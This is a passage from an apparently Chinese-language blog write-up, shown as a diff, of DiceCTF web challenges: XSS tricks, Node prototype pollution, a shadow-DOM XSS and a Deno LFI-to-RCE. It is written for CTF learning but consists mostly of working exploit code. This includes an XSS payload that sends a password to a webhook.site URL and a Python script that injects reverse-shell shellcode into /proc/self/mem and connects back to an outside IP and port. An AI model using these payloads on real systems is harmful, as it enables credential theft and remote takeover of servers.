+    <span style=color:#111>})</span>
+  <span style=color:#111>})).</span><span style=color:#75af00>json</span><span style=color:#111>();</span>
+
+  <span style=color:#111>document</span><span style=color:#111>.</span><span style=color:#75af00>querySelector</span><span style=color:#111>(</span><span style=color:#d88200>&#39;.note&#39;</span><span style=color:#111>).</span><span style=color:#75af00>innerHTML</span> <span style=color:#f92672>=</span> <span style=color:#75af00>text</span><span style=color:#111>;</span>
+  <span style=color:#75715e>// 在底下這行執行之前，會先執行我們的 XSS payload
+</span><span style=color:#75715e></span>  <span style=color:#111>document</span><span style=color:#111>.</span><span style=color:#75af00>querySelector</span><span style=color:#111>(</span><span style=color:#d88200>&#39;.views&#39;</span><span style=color:#111>).</span><span style=color:#75af00>innerText</span> <span style=color:#f92672>=</span> <span style=color:#75af00>views</span><span style=color:#111>;</span>
+<span style=color:#111>})();</span>
+</code></pre></div><p>利用上面<code>&lt;svg></code>插入后先执行的特点，如果我们可以在最后一行执行之前，doSomeMagic，将<code>document.querySelector</code>覆盖，再把<code>JSON.stringify</code>覆盖，像这样</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#111>document</span><span style=color:#111>.</span><span style=color:#75af00>querySelector</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>function</span><span style=color:#111>(){</span>
+	<span style=color:#75af00>JSON</span><span style=color:#111>.</span><span style=color:#75af00>stringify</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>date</span><span style=color:#111>){</span>
+
+	<span style=color:#111>}</span>
+<span style=color:#111>}</span>
+</code></pre></div><p>之后就可以用传统艺能<code>arguments.callee.caller</code>了，可以取到调用<code>JSON.stringify</code>的<code>async</code>并调用一次，就可以执行我们的内容了</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#111>document</span><span style=color:#111>.</span><span style=color:#75af00>querySelector</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>function</span><span style=color:#111>(){</span>
+	<span style=color:#75af00>JSON</span><span style=color:#111>.</span><span style=color:#75af00>stringify</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>data</span><span style=color:#111>){</span>
+		<span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>data</span><span style=color:#111>.</span><span style=color:#75af00>password</span><span style=color:#111>)</span>	<span style=color:#75715e>// true payload here!!!
+</span><span style=color:#75715e></span>	<span style=color:#111>}</span>
+	<span style=color:#75af00>arguments</span><span style=color:#111>.</span><span style=color:#75af00>callee</span><span style=color:#111>.</span><span style=color:#75af00>caller</span><span style=color:#111>()</span>
+<span style=color:#111>}</span>
+</code></pre></div><p>全payload</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#f92672>&lt;</span><span style=color:#75af00>svg</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#75af00>svg</span><span style=color:#f92672>/</span><span style=color:#75af00>onload</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;document.querySelector=function(){JSON.stringify=a=&gt;fetch(`https://webhook.site/11b32903-2d6a-4efc-b687-e06a0f0226aa?`+a.password),arguments.callee.caller()}&#34;</span><span style=color:#f92672>&gt;</span>
+</code></pre></div><h2 id=webvm-calc>web/vm-calc</h2>
+<blockquote>
+<p>A simple and very secure online calculator!</p>
+<p><a href=https://instancer.mc.ax/vm-calc>instancer.mc.ax/vm-calc</a></p>
+<p><a href=https://static.dicega.ng/uploads/6dcf39e45c26032a15d83fb62515e9df26059e4345b978dad07a17b2bf2c5826/dist.tar>dist.tar</a></p>
+</blockquote>
+<p>先看package.json涉及到包的版本信息，最新版本的vm2(3.9.5)，无公开的逃逸漏洞 所以肯定不是沙盒逃逸，hbs版本存在一个文件泄露的洞<a href=https://securitylab.github.com/advisories/GHSL-2021-020-pillarjs-hbs/>CVE-2021-32822</a></p>
+<p>然后看index.js，.我们需要登入admin账号拿flag，虽然给出了我们username和password，但是是sha256后的结果，没法摁得到明文</p>
+<p>————看到wp后发现自己还是查的少了，不是vm2没0day，而是这里用的是Nodejs的1day，<a href=https://nodejs.org/en/blog/vulnerability/jan-2022-security-releases/#prototype-pollution-via-console-table-properties-low-cve-2022-21824>CVE-2022-21824</a>，出问题的地方是<code>map</code></p>
+<pre tabindex=0><code>console.table([{x:1}], [&quot;__proto__&quot;]);
+</code></pre><p>就可以做到原型污染</p>
+<p>题目中的filter检测是这样的</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#75af00>users</span><span style=color:#111>.</span><span style=color:#75af00>filter</span><span style=color:#111>(</span><span style=color:#75af00>u</span> <span style=color:#111>=&gt;</span> <span style=color:#75af00>u</span><span style=color:#111>.</span><span style=color:#75af00>user</span> <span style=color:#f92672>===</span> <span style=color:#75af00>user</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#75af00>u</span><span style=color:#111>.</span><span style=color:#75af00>pass</span> <span style=color:#f92672>===</span> <span style=color:#75af00>hash</span><span style=color:#111>)[</span><span style=color:#ae81ff>0</span><span style=color:#111>]</span> <span style=color:#f92672>!==</span> <span style=color:#00a8c8>undefined</span><span style=color:#111>)</span> <span style=color:#111>{</span>
+    <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>render</span><span style=color:#111>(</span><span style=color:#d88200>&#34;admin&#34;</span><span style=color:#111>,</span> <span style=color:#111>{</span> <span style=color:#75af00>flag</span><span style=color:#f92672>:</span> <span style=color:#00a8c8>await</span> <span style=color:#75af00>fsp</span><span style=color:#111>.</span><span style=color:#75af00>readFile</span><span style=color:#111>(</span><span style=color:#d88200>&#34;flag.txt&#34;</span><span style=color:#111>)</span> <span style=color:#111>});</span>
+<span style=color:#111>}</span>
+</code></pre></div><p>所以只要污染原型链，让<code>[][0]</code>不为空，就可以通过admin的检测</p>
+<h2 id=webshadow>web/shadow</h2>
+<blockquote>
+<p>I found a totally secure way to insert secrets into a webpage</p>
+<p><a href=https://shadow.mc.ax/>shadow.mc.ax</a> | <a href=https://admin-bot.mc.ax/shadow>Admin Bot</a></p>
+</blockquote>
+<p>页面源码可以看到js</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=color:#111>&lt;</span><span style=color:#f92672>script</span><span style=color:#111>&gt;</span>
+      <span style=color:#75715e>// the admin has the flag set in localStorage[&#34;secret&#34;]
+</span><span style=color:#75715e></span>      <span style=color:#00a8c8>let</span> <span style=color:#75af00>secret</span> <span style=color:#f92672>=</span> <span style=color:#75af00>localStorage</span><span style=color:#111>.</span><span style=color:#75af00>getItem</span><span style=color:#111>(</span><span style=color:#d88200>&#34;secret&#34;</span><span style=color:#111>)</span> <span style=color:#f92672>??</span> <span style=color:#d88200>&#34;dice{not_real_flag}&#34;</span>
+      <span style=color:#00a8c8>let</span> <span style=color:#75af00>shadow</span> <span style=color:#f92672>=</span> <span style=color:#111>window</span><span style=color:#111>.</span><span style=color:#75af00>vault</span><span style=color:#111>.</span><span style=color:#75af00>attachShadow</span><span style=color:#111>({</span> <span style=color:#75af00>mode</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#34;closed&#34;</span> <span style=color:#111>});</span>
+      <span style=color:#00a8c8>let</span> <span style=color:#75af00>div</span> <span style=color:#f92672>=</span> <span style=color:#111>document</span><span style=color:#111>.</span><span style=color:#75af00>createElement</span><span style=color:#111>(</span><span style=color:#d88200>&#34;div&#34;</span><span style=color:#111>);</span>
+      <span style=color:#75af00>div</span><span style=color:#111>.</span><span style=color:#75af00>innerHTML</span> <span style=color:#f92672>=</span> <span style=color:#d88200>`
+</span><span style=color:#d88200>          &lt;p&gt;steal me :)&lt;/p&gt;
+</span><span style=color:#d88200>          &lt;!-- secret: </span><span style=color:#d88200>${</span><span style=color:#75af00>secret</span><span style=color:#d88200>}</span><span style=color:#d88200> --&gt;
+</span><span style=color:#d88200>      `</span><span style=color:#111>;</span>
+      <span style=color:#00a8c8>let</span> <span style=color:#75af00>params</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#75af00>URL</span><span style=color:#111>(</span><span style=color:#111>document</span><span style=color:#111>.</span><span style=color:#75af00>location</span><span style=color:#111>).</span><span style=color:#75af00>searchParams</span><span style=color:#111>;</span>
+      <span style=color:#00a8c8>let</span> <span style=color:#75af00>x</span> <span style=color:#f92672>=</span> <span style=color:#75af00>params</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#34;x&#34;</span><span style=color:#111>);</span>
+      <span style=color:#00a8c8>let</span> <span style=color:#75af00>y</span> <span style=color:#f92672>=</span> <span style=color:#75af00>params</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#34;y&#34;</span><span style=color:#111>);</span>
+      <span style=color:#75af00>div</span><span style=color:#111>.</span><span style=color:#75af00>style</span> <span style=color:#f92672>=</span> <span style=color:#75af00>y</span><span style=color:#111>;</span>
+      <span style=color:#75af00>shadow</span><span style=color:#111>.</span><span style=color:#75af00>appendChild</span><span style=color:#111>(</span><span style=color:#75af00>div</span><span style=color:#111>);</span>
+      <span style=color:#75af00>secret</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>null</span><span style=color:#111>;</span>
+      <span style=color:#75af00>localStorage</span><span style=color:#111>.</span><span style=color:#75af00>removeItem</span><span style=color:#111>(</span><span style=color:#d88200>&#34;secret&#34;</span><span style=color:#111>);</span>
+      <span style=color:#75af00>shadow</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>null</span><span style=color:#111>;</span>
+      <span style=color:#75af00>div</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>null</span><span style=color:#111>;</span>
+
+      <span style=color:#75715e>// free XSS
+</span><span style=color:#75715e></span>      <span style=color:#111>window</span><span style=color:#111>.</span><span style=color:#75af00>xss</span><span style=color:#111>.</span><span style=color:#75af00>innerHTML</span> <span style=color:#f92672>=</span> <span style=color:#75af00>x</span><span style=color:#111>;</span>
+<span style=color:#111>&lt;/</span><span style=color:#f92672>script</span><span style=color:#111>&gt;</span>
+</code></pre></div><p>使用cloesd模式的shadow DOM，我们无法直接处理它的DOM结构</p>
+<p>但是CSS样式可控，我们这里使用一个非标准的CSS属性：<code>-webkit-user-modify</code>，它与<code>contenteditable</code>类似，可以调用<code>document.execCommand</code>来插入HTML</p>
+<p>整体思路：先用 <code>window.find</code>去focus内容之后，再执行<code>document.execCommand</code>去插入 HTML，然后通过<code>svg</code>的event去执行JS拿到节点</p>
+<pre tabindex=0><code>/?y=-webkit-user-modify:+read-write&amp;x=&lt;img+src=x+onerror=&quot;find('steal me');document.execCommand('insertHTML',false,'&lt;svg/onload=alert(this.parentNode.innerHTML)&gt;')&quot;&gt;
+</code></pre><p>如果没有<code>focus</code>会失败；用img这样的会读不到<code>this.parentNode</code>，但是如果在前面加上<code>document.exec('selectAll')</code>也是可以的</p>
+<pre tabindex=0><code>/?y=-webkit-user-modify:+read-write&amp;x=&lt;img+src=x+onerror=&quot;find('steal me');document.execCommand('selectAll');document.execCommand('insertHTML',false,'&lt;img/src=x+onerror=alert(this.parentNode.parentNode.innerHTML)&gt;')&quot;&gt;
+</code></pre><h2 id=webdenoblog>***web/denoblog</h2>
+<blockquote>
+<p>I love NodeJS and all, but I&rsquo;ve heard that Deno is pretty cool&mldr;</p>
+<p>I&rsquo;m making my new blog on it! Even if there&rsquo;s a vuln, Deno will protect me, right?</p>
+<p><a href=https://instancer.mc.ax/denoblog>instancer.mc.ax/denoblog</a></p>
+<p><a href=https://static.dicega.ng/uploads/2d72629f8cef01b7c3809bfc5228d27865cfb9c54bc5772223456a9599d8c734/dist.tar>dist.tar</a></p>
+</blockquote>
+<p>页面上只有切换显示语言的功能，其它什么都没有，看一下app.ts</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-tsx data-lang=tsx><span style=color:#00a8c8>import</span> <span style=color:#111>{</span> <span style=color:#75af00>serve</span> <span style=color:#111>}</span> <span style=color:#00a8c8>from</span> <span style=color:#d88200>&#34;https://deno.land/std/http/server.ts&#34;</span><span style=color:#111>;</span>
+<span style=color:#00a8c8>import</span> <span style=color:#f92672>*</span> <span style=color:#00a8c8>as</span> <span style=color:#75af00>cookie</span> <span style=color:#00a8c8>from</span> <span style=color:#d88200>&#34;https://deno.land/std/http/cookie.ts&#34;</span><span style=color:#111>;</span>
+
+<span style=color:#00a8c8>import</span> <span style=color:#f92672>*</span> <span style=color:#00a8c8>as</span> <span style=color:#75af00>dejs</span> <span style=color:#00a8c8>from</span> <span style=color:#d88200>&#34;https://deno.land/x/dejs/mod.ts&#34;</span><span style=color:#111>;</span>
+
+<span style=color:#00a8c8>const</span> <span style=color:#75af00>port</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>8080</span><span style=color:#111>;</span>
+
+<span style=color:#00a8c8>const</span> <span style=color:#75af00>handler</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>async</span> <span style=color:#111>(</span><span style=color:#75af00>req</span>: <span style=color:#00a8c8>Request</span><span style=color:#111>)</span><span style=color:#f92672>:</span> <span style=color:#75af00>Promise</span><span style=color:#111>&lt;</span><span style=color:#f92672>Response</span><span style=color:#111>&gt;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#111>{</span>
+  <span style=color:#00a8c8>let</span> <span style=color:#75af00>lang</span> <span style=color:#f92672>=</span> <span style=color:#75af00>cookie</span><span style=color:#111>.</span><span style=color:#75af00>getCookies</span><span style=color:#111>(</span><span style=color:#75af00>req</span><span style=color:#111>.</span><span style=color:#75af00>headers</span><span style=color:#111>)[</span><span style=color:#d88200>&#34;lang&#34;</span><span style=color:#111>]</span> <span style=color:#f92672>??</span> <span style=color:#d88200>&#34;en&#34;</span><span style=color:#111>;</span>
+
+  <span style=color:#00a8c8>let</span> <span style=color:#75af00>body</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>await</span> <span style=color:#75af00>dejs</span><span style=color:#111>.</span><span style=color:#75af00>renderFileToString</span><span style=color:#111>(</span><span style=color:#d88200>&#34;./views/index.ejs&#34;</span><span style=color:#111>,</span> <span style=color:#111>{</span> <span style=color:#75af00>lang</span> <span style=color:#111>});</span>
+
+  <span style=color:#00a8c8>let</span> <span style=color:#75af00>headers</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#75af00>Headers</span><span style=color:#111>();</span>
+  <span style=color:#75af00>headers</span><span style=color:#111>.</span><span style=color:#00a8c8>set</span><span style=color:#111>(</span><span style=color:#d88200>&#34;content-type&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;text/html&#34;</span><span style=color:#111>);</span>
+
+  <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>new</span> <span style=color:#75af00>Response</span><span style=color:#111>(</span><span style=color:#75af00>body</span><span style=color:#111>,</span> <span style=color:#111>{</span> <span style=color:#75af00>headers</span><span style=color:#111>,</span> <span style=color:#75af00>status</span>: <span style=color:#00a8c8>200</span> <span style=color:#111>});</span>
+<span style=color:#111>};</span>
+
+<span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#d88200>&#34;[app] server now listening for connections...&#34;</span><span style=color:#111>);</span>
+<span style=color:#00a8c8>await</span> <span style=color:#75af00>serve</span><span style=color:#111>(</span><span style=color:#75af00>handler</span><span style=color:#111>,</span> <span style=color:#111>{</span> <span style=color:#75af00>port</span> <span style=color:#111>});</span>
+</code></pre></div><p>它使用cookie记录语言是<code>en</code>还是<code>es</code>，默认<code>en</code>，之后渲染<code>./views/index.ejs</code>为对应的语言</p>
+<pre tabindex=0><code class=language-ejs data-lang=ejs>&lt;% await include(`./langs/${lang}`); %&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;denoblog&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://unpkg.com/@picocss/pico@latest/css/pico.classless.min.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;main&gt;
+        &lt;hgroup&gt;
+            &lt;h1&gt;denoblog&lt;/h1&gt;
+            &lt;h2&gt;&lt;%= i18n.HEADER %&gt;&lt;/h2&gt;
+        &lt;/hgroup&gt;
+        &lt;nav&gt;
+            &lt;ul&gt;
+                &lt;li&gt;&lt;%= i18n.SWITCH_LANG %&gt;&lt;/li&gt;
+                &lt;li&gt;&lt;a href=&quot;javascript:document.cookie = 'lang=en'; location.reload();&quot;&gt;English&lt;/a&gt;&lt;/li&gt;
+                &lt;li&gt;&lt;a href=&quot;javascript:document.cookie = 'lang=es'; location.reload();&quot;&gt;Español&lt;/a&gt;&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/nav&gt;
+        &lt;hr /&gt;
+        &lt;%= i18n.COMING_SOON %&gt;
+    &lt;/main&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>注意到它用了<code>include</code>，如果让它包含其它的，就可以LFI了</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e># 爆破pid</span>
+<span style=color:#f92672>import</span> <span style=color:#111>requests</span>
+
+<span style=color:#111>HOST</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;https://denoblog-26b8ed381fd6c5f9.mc.ax&#34;</span>
+
+<span style=color:#00a8c8>while</span> <span style=color:#00a8c8>True</span><span style=color:#111>:</span>
+    <span style=color:#00a8c8>for</span> <span style=color:#111>num</span> <span style=color:#f92672>in</span> <span style=color:#111>range</span><span style=color:#111>(</span><span style=color:#ae81ff>8</span><span style=color:#111>,</span> <span style=color:#ae81ff>15</span><span style=color:#111>):</span>
+        <span style=color:#00a8c8>for</span> <span style=color:#111>num2</span> <span style=color:#f92672>in</span> <span style=color:#111>range</span><span style=color:#111>(</span><span style=color:#ae81ff>9</span><span style=color:#111>,</span><span style=color:#ae81ff>13</span><span style=color:#111>):</span>
+            <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#d88200>f</span><span style=color:#d88200>&#34;attempting: ../../../../../../../../proc/</span><span style=color:#d88200>{</span><span style=color:#111>num</span><span style=color:#d88200>}</span><span style=color:#d88200>/fd/</span><span style=color:#d88200>{</span><span style=color:#111>num2</span><span style=color:#d88200>}</span><span style=color:#d88200>&#34;</span><span style=color:#111>)</span>
+            <span style=color:#00a8c8>try</span><span style=color:#111>:</span>
+                <span style=color:#111>r</span> <span style=color:#f92672>=</span> <span style=color:#111>requests</span><span style=color:#f92672>.</span><span style=color:#111>get</span><span style=color:#111>(</span><span style=color:#111>HOST</span><span style=color:#111>,</span> <span style=color:#111>cookies</span><span style=color:#f92672>=</span><span style=color:#111>{</span><span style=color:#d88200>&#34;lang&#34;</span><span style=color:#111>:</span> <span style=color:#d88200>f</span><span style=color:#d88200>&#34;../../../../../../../../proc/</span><span style=color:#d88200>{</span><span style=color:#111>num</span><span style=color:#d88200>}</span><span style=color:#d88200>/fd/</span><span style=color:#d88200>{</span><span style=color:#111>num2</span><span style=color:#d88200>}</span><span style=color:#d88200>&#34;</span><span style=color:#111>})</span>
+            <span style=color:#00a8c8>except</span><span style=color:#111>:</span>
+                <span style=color:#00a8c8>pass</span>
+</code></pre></div><p>但是如何rce呢？一转pwn势</p>
+<p>在dockerfile中有这样的权限设置</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-dockerfile data-lang=dockerfile><span style=color:#00a8c8>RUN</span> deno compile --allow-read --allow-write --allow-net app.ts<span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010></span><span style=color:#00a8c8>RUN</span> chmod <span style=color:#ae81ff>755</span> /app/app<span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p>写入<code>/proc/self/mem</code>，覆盖内存，调用<code>JSON.stringify</code>来触发代码</p>
+<blockquote>
+<p>Now, where to write is the question. I ran <code>deno</code> with gdb, and printed the address of <code>Builtins_JsonStringify</code>. This address was at a constant offset each time, so I just clobbered this region in memory with my own shellcode, then ran <code>JSON.stringify()</code> to trigger my code.</p>
+<pre tabindex=0><code>(gdb) p Builtins_JsonStringify
+$4 = {&lt;text variable, no debug info&gt;} 0x281d340 &lt;Builtins_JsonStringify&gt;
+</code></pre><p>So, I created my shellcode, and injected into the <code>deno</code> process at the right section, then ran <code>JSON.stringify()</code> all through an ejs template included with a file descriptor. Doing all of this gets you the flag!</p>
+</blockquote>
+<p>payload</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> <span style=color:#111>requests</span>
+<span style=color:#f92672>import</span> <span style=color:#111>base64</span>
+
+<span style=color:#111>HOST</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;https://denoblog-26b8ed381fd6c5f9.mc.ax&#34;</span>
+
+<span style=color:#111>IPADDR</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;1.1.1.1&#34;</span>
+<span style=color:#111>PORT</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>12345</span>
+
+<span style=color:#111>addr_hex</span> <span style=color:#f92672>=</span> <span style=color:#111>bytes</span><span style=color:#f92672>.</span><span style=color:#111>fromhex</span><span style=color:#111>(</span><span style=color:#d88200>&#39;&#39;</span><span style=color:#f92672>.</span><span style=color:#111>join</span><span style=color:#111>([</span><span style=color:#111>hex</span><span style=color:#111>(</span><span style=color:#111>int</span><span style=color:#111>(</span><span style=color:#111>n</span><span style=color:#111>))[</span><span style=color:#ae81ff>2</span><span style=color:#111>:]</span><span style=color:#f92672>.</span><span style=color:#111>zfill</span><span style=color:#111>(</span><span style=color:#ae81ff>2</span><span style=color:#111>)</span> <span style=color:#00a8c8>for</span> <span style=color:#111>n</span> <span style=color:#f92672>in</span> <span style=color:#111>IPADDR</span><span style=color:#f92672>.</span><span style=color:#111>split</span><span style=color:#111>(</span><span style=color:#d88200>&#34;.&#34;</span><span style=color:#111>)]))</span>
+<span style=color:#111>port_hex</span> <span style=color:#f92672>=</span> <span style=color:#111>bytes</span><span style=color:#f92672>.</span><span style=color:#111>fromhex</span><span style=color:#111>(</span><span style=color:#111>hex</span><span style=color:#111>(</span><span style=color:#111>PORT</span><span style=color:#111>)[</span><span style=color:#ae81ff>2</span><span style=color:#111>:])</span>
+
+<span style=color:#111>shellcode</span> <span style=color:#f92672>=</span> \
+<span style=color:#d88200>b</span><span style=color:#d88200>&#34;</span><span style=color:#8045ff>\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a</span><span style=color:#d88200>&#34;</span> <span style=color:#f92672>+</span> \
+<span style=color:#d88200>b</span><span style=color:#d88200>&#34;</span><span style=color:#8045ff>\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0</span><span style=color:#d88200>&#34;</span> <span style=color:#f92672>+</span> \
+<span style=color:#d88200>b</span><span style=color:#d88200>&#34;</span><span style=color:#8045ff>\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24</span><span style=color:#d88200>&#34;</span> <span style=color:#f92672>+</span> \
+<span style=color:#d88200>b</span><span style=color:#d88200>&#34;</span><span style=color:#8045ff>\x02</span><span style=color:#d88200>&#34;</span> <span style=color:#f92672>+</span> <span style=color:#111>port_hex</span> <span style=color:#f92672>+</span> <span style=color:#d88200>b</span><span style=color:#d88200>&#34;</span><span style=color:#8045ff>\xc7\x44\x24\x04</span><span style=color:#d88200>&#34;</span> <span style=color:#f92672>+</span> <span style=color:#111>addr_hex</span> <span style=color:#f92672>+</span> <span style=color:#d88200>b</span><span style=color:#d88200>&#34;</span><span style=color:#8045ff>\x48\x89\xe6\x6a\x10</span><span style=color:#d88200>&#34;</span> <span style=color:#f92672>+</span> \
+<span style=color:#d88200>b</span><span style=color:#d88200>&#34;</span><span style=color:#8045ff>\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48</span><span style=color:#d88200>&#34;</span> <span style=color:#f92672>+</span> \
+<span style=color:#d88200>b</span><span style=color:#d88200>&#34;</span><span style=color:#8045ff>\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a</span><span style=color:#d88200>&#34;</span> <span style=color:#f92672>+</span> \
+<span style=color:#d88200>b</span><span style=color:#d88200>&#34;</span><span style=color:#8045ff>\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54</span><span style=color:#d88200>&#34;</span> <span style=color:#f92672>+</span> \
+<span style=color:#d88200>b</span><span style=color:#d88200>&#34;</span><span style=color:#8045ff>\x5f\x6a\x3b\x58\x0f\x05</span><span style=color:#d88200>&#34;</span>
+
+<span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;&#34;&#34;
+</span><span style=color:#d88200>&lt;%
+</span><span style=color:#d88200>let maps = await Deno.readTextFile(&#39;/proc/self/maps&#39;);
+</span><span style=color:#d88200>let line = maps.split(&#34;</span><span style=color:#8045ff>\\</span><span style=color:#d88200>n&#34;).find(l =&gt; l.includes(&#34;/app/app&#34;) &amp;&amp; l.includes(&#34;r-x&#34;));
+</span><span style=color:#d88200>
+</span><span style=color:#d88200>let base = parseInt(line.split(&#34; &#34;)[0].split(&#34;-&#34;)[0], 16);
+</span><span style=color:#d88200>let mem = await Deno.open(&#39;/proc/self/mem&#39;, { write: true });
+</span><span style=color:#d88200>
+</span><span style=color:#d88200>let offset = base + 0xd39340;
+</span><span style=color:#d88200>console.log(&#34;[pwn] Builtins_JsonStringify @ 0x&#34; + (offset).toString(16));
+</span><span style=color:#d88200>await Deno.seek(mem.rid, offset, Deno.SeekMode.Start);
+</span><span style=color:#d88200>
+</span><span style=color:#d88200>let shellcode = `&#34;&#34;&#34;</span> <span style=color:#f92672>+</span> <span style=color:#111>base64</span><span style=color:#f92672>.</span><span style=color:#111>b64encode</span><span style=color:#111>(</span><span style=color:#111>shellcode</span><span style=color:#111>)</span><span style=color:#f92672>.</span><span style=color:#111>decode</span><span style=color:#111>()</span> <span style=color:#f92672>+</span> <span style=color:#d88200>&#34;&#34;&#34;`;
+</span><span style=color:#d88200>shellcode = atob(shellcode);
+</span><span style=color:#d88200>shellcode = &#34;</span><span style=color:#8045ff>\\</span><span style=color:#d88200>x90&#34;.repeat(512) + shellcode;
+</span><span style=color:#d88200>let shellcode_arr = new Uint8Array(shellcode.length);
+</span><span style=color:#d88200>
+</span><span style=color:#d88200>for(let i = 0; i &lt; shellcode.length; i++) {
+</span><span style=color:#d88200>    shellcode_arr[i] = shellcode.charCodeAt(i);
+</span><span style=color:#d88200>}
+</span><span style=color:#d88200>
+</span><span style=color:#d88200>console.log(&#34;[pwn] lets go~&#34;);
+</span><span style=color:#d88200>
+</span><span style=color:#d88200>await Deno.write(mem.rid, shellcode_arr);
+</span><span style=color:#d88200>JSON.stringify(&#34;wtmoo&#34;);
+</span><span style=color:#d88200>%&gt;
+</span><span style=color:#d88200>&#34;&#34;&#34;</span>
+
+<span style=color:#111>payload</span> <span style=color:#f92672>+=</span> <span style=color:#d88200>&#34;A&#34;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>1024</span><span style=color:#f92672>*</span><span style=color:#ae81ff>64</span>
+
+<span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#d88200>f</span><span style=color:#d88200>&#34;sending rev shell to </span><span style=color:#d88200>{</span><span style=color:#111>IPADDR</span><span style=color:#d88200>}</span><span style=color:#d88200>:</span><span style=color:#d88200>{</span><span style=color:#111>PORT</span><span style=color:#d88200>}</span><span style=color:#d88200>...&#34;</span><span style=color:#111>)</span>
+<span style=color:#00a8c8>while</span> <span style=color:#00a8c8>True</span><span style=color:#111>:</span>
+    <span style=color:#111>r</span> <span style=color:#f92672>=</span> <span style=color:#111>requests</span><span style=color:#f92672>.</span><span style=color:#111>get</span><span style=color:#111>(</span><span style=color:#111>HOST</span><span style=color:#111>,</span> <span style=color:#111>data</span><span style=color:#f92672>=</span><span style=color:#111>payload</span><span style=color:#111>)</span>
+</code></pre></div><p>还能说什么呢 牛逼</p>
+<p>————以上后面pwn的地方我直接复制的官方wp</p>
+<h2 id=miscundefined>misc/undefined</h2>
+<blockquote>
+<p>I was writing some Javascript when everything became undefined&mldr;</p>
+<p>Can you create something out of nothing and read the flag at <code>/flag.txt</code>? Tested for Node version 17.</p>
+<p><code>nc mc.ax 31131</code></p>
+<p><a href=https://static.dicega.ng/uploads/014c52a7d294f05332240ef18c2c296af6e4bea6ff6899b7f09726e19c74dec7/index.js>index.js</a></p>
+</blockquote>
+<p>额，几乎把js所有乱七八糟的东西都整成undefined了</p>
